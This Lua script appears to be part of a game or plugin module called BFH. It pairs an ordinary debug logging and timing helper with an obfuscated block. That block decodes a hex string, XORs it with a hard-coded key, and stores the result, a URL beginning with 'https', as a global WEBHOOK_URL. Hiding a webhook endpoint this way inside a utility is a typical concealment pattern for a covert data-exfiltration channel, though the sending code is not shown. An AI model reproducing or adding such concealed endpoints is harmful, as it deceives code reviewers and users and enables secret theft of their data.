do
  local BFH={}
  BFH.DEBUG=false
  BFH.LOG_LEVEL=3
  local _yOjOnhAO={"OFF","ERROR","WARN","INFO","DEBUG","TRACE"}
  function BFH.log(l,m,msg)
    if BFH.DEBUG and l<=BFH.LOG_LEVEL then print("[BFH]["..tostring(m).."]["..(_yOjOnhAO[l+1]or"?").."] "..tostring(msg))end
  end
  function BFH.time(m,n,f)
    local s=os.clock();local ok,r=pcall(f);local c=(os.clock()-s)*1000
    if ok then BFH.log(3,m,n.." OK ("..string.format("%.1f",c).."ms)")
    else BFH.log(1,m,n.." FAIL: "..tostring(r).." ("..string.format("%.1f",c).."ms)")end
    return ok,r
  end
  local _C=_G.BFH.Core;_G.BFH=BFH;_G.BFH.Core=_C or {}
end
_G.BFH = _G.BFH or {}
do
  local __jfj6 = "291b1f192257706d22212c515f405071300a0e5d0404486e180e0b3902302935676e070106066a66505045544517795f5c5867557017331e0c517b0b436e632a29193330522c370e36372c393b092227467d48196b273d0b37211c0c3724095c1e1c332e7e1e274707645c6f3c09274b1c3952381d01206227"
  local __9g9u = "AokiQm_BFH_2024_Secret!"
  local __epry =   (function(s)
    local __hlx6 = {}
    for __9xod = 1, # s, 2 do
      __hlx6[# __hlx6 + 1] =       string.char(      tonumber(      s:sub(__9xod, __9xod + 1), 16))
    end
    return     table.concat(__hlx6)
  end)(__jfj6)
  local __auzw =   (function(s, k)
    local __hlx6 = {}
    for __9xod = 1, # s do
      local __jk3l =       string.byte(s, __9xod)
      local __321q =       string.byte(k, (__9xod - 1) % # k + 1)
      local __9fli = 0
      for __7rm3 = 0, 7 do
        local __2vkf = 2 ^ __7rm3
        local __1bf = (__jk3l % (__2vkf * 2)) >= __2vkf and 1 or 0
        local __65s8 = (__321q % (__2vkf * 2)) >= __2vkf and 1 or 0
        if __1bf ~= __65s8 then
          __9fli = __9fli + __2vkf
        end
      end
      __hlx6[__9xod] =       string.char(__9fli)
    end
    return     table.concat(__hlx6)
  end)(__epry, __9g9u)
  _G.BFH.WEBHOOK_URL = __auzw
end
